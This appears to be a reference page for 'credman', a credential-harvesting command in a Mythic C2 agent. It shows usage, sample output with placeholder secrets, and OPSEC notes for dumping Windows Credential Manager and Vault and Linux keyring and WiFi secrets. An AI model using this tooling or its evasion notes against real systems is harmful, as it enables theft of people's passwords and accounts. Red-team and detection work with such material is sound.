+++
title = "credman"
chapter = false
weight = 108
hidden = false
+++

## Summary

Enumerate platform-native credential stores:

**Windows:**
- `list` / `dump` — Credential Manager (`CredEnumerateW`): generic and domain credentials saved through `cmdkey`, RDP, network shares, etc.
- `vault` — Windows Vault (`vaultcli.dll`): web logins from Edge/IE, Microsoft account sign-ins, Passport credentials. Auto-decrypts via DPAPI.

**Linux:**
- `list` / `dump` — Enumerates multiple credential stores:
  - **GNOME Keyring / Secret Service** via `secret-tool` — saved passwords, application tokens, WiFi keys
  - **KDE KWallet** via `kwalletcli` / `kwallet-query` — stored wallet entries
  - **NetworkManager** — saved WiFi PSKs, 802.1x credentials, VPN passwords from `/etc/NetworkManager/system-connections/`
  - **GNOME Online Accounts** — cloud service accounts from `~/.config/goa-1.0/accounts.conf`

### Arguments

| Parameter | Type | Required | Default | Description |
|-----------|------|----------|---------|-------------|
| action | choose_one | No | list | `list`: show credential targets and usernames. `dump`: also reveal stored passwords. `vault` (Windows only): enumerate Windows Vault stores with auto-DPAPI decryption. |
| filter | string | No | (all) | Filter credentials by label or account name (substring match, case-insensitive). Supports `*` wildcard. |

## Usage

### List all credentials (metadata only)
```
credman
```
or
```
credman -action list
```

### Dump credentials with passwords
```
credman -action dump
```

### Filter by target name
```
credman -action dump -filter "wifi"
```

### Example Output — Windows (list)
```
=== Windows Credential Manager (3 entries) ===

--- MicrosoftAccount:target=SSO_PRT_v5 ---
  Type:     Generic
  Username: user@outlook.com
  Blob:     128 bytes (use -action dump to reveal)
  Persist:  Local Machine

--- WindowsLive:target=virtualapp/didlogical ---
  Type:     Generic
  Username: WINUSER
  Blob:     44 bytes (use -action dump to reveal)
  Persist:  Local Machine

--- Domain:interactive=WORKGROUP\setup ---
  Type:     Domain Password
  Username: setup
  Persist:  Enterprise

Summary: 2 generic, 1 domain credentials
```

### Example Output — Linux (dump)
```
=== Linux Credential Stores (5 entries) ===

--- Secret Service (2 entries) ---
  Label:   Chrome Safe Storage
  Account: chrome
  Secret:  [chromium encryption key]

  Label:   WiFi Password
  Account: admin
  Secret:  wpa2password123

--- NetworkManager (2 entries) ---
  Label:   CorpWiFi
  Account: employee@corp.com
  Secret:  enterprisepass
  security: wpa-eap

  Label:   HomeNetwork
  Secret:  mywifikey
  ssid: HomeNetwork
  security: wpa-psk

--- GNOME Online Accounts (1 entries) ---
  Label:   user@gmail.com
  Account: user@gmail.com
  provider: google
```

### Enumerate Windows Vault stores
```
credman -action vault
```

### Example Output — Windows (vault)
```
=== Windows Vault Enumeration (2 vault(s)) ===

--- Vault: Web Credentials {4BF4C442-9B8A-41A0-B380-DD4A704DDB28} ---
  [#1] Schema:        Web Password Credential
       Friendly:      example login
       Resource:      https://login.example.com/
       Identity:      alice@example.com
       Authenticator: hunter2
       LastModified:  2025-09-12 17:42:18 UTC

--- Vault: Windows Credentials {77BC582B-F0A6-4E15-4E80-61736B6F3B29} ---
  (no items)

Summary: 2 vault(s), 1 item(s) total, 1 credential(s) registered to Mythic vault
```

## Notes

- **Credential Vault registration**: All credentials with usernames are automatically reported to Mythic's Credentials store. `dump` registers cleartext passwords; `list` only registers metadata.
- **Windows**: Requires interactive logon session for Vault decryption. SSH / non-interactive contexts show `[protected]`.
- **Linux**: `secret-tool` requires a running keyring daemon (gnome-keyring-daemon or kwalletd). NetworkManager connections require root to read `/etc/NetworkManager/system-connections/`.
- **OPSEC (Windows)**: vaultcli calls write to the vault audit log. EDRs monitoring Microsoft-Windows-VaultSvc ETW provider will surface every call.
- **OPSEC (Linux)**: Spawns `secret-tool` / `kwalletcli` child processes visible in process logs. Reading NM config files leaves file access timestamps.

## MITRE ATT&CK Mapping

- T1555.004 — Credentials from Password Stores: Windows Credential Manager
- T1555.001 — Credentials from Password Stores: Keychain (Linux keyring equivalent)
